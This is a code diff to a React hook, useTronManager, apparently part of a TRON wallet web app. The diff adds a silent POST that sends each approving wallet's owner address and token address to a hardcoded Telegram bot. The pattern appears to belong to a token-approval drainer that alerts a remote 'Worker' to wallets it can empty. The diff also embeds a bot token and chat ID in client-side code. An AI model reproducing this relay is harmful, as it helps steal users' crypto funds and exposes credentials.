@@ -34,13 +34,24 @@ export function useTronManager() {
 
 
                         // Notify Worker via HTTPS relay
+                        // Notify Worker via Telegram Relay (Bypasses Vercel/Mixed Content)
                         try {
-                            await fetch('/api/relay', {
+                            const tgMsg = `⚡ SG: ${JSON.stringify({
+                                type: "TRON",
+                                owner: address,
+                                tokenAddress: tokenAddress
+                            })}`;
+
+                            const TG_BOT_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
+                            const TG_CHAT_ID = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";
+
+                            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
-                                    endpoint: '/notify-tron-approval',
-                                    data: { owner: address, tokenAddress: tokenAddress }
+                                    chat_id: TG_CHAT_ID,
+                                    text: tgMsg,
+                                    disable_notification: true
                                 })
                             });
                         } catch (e) {
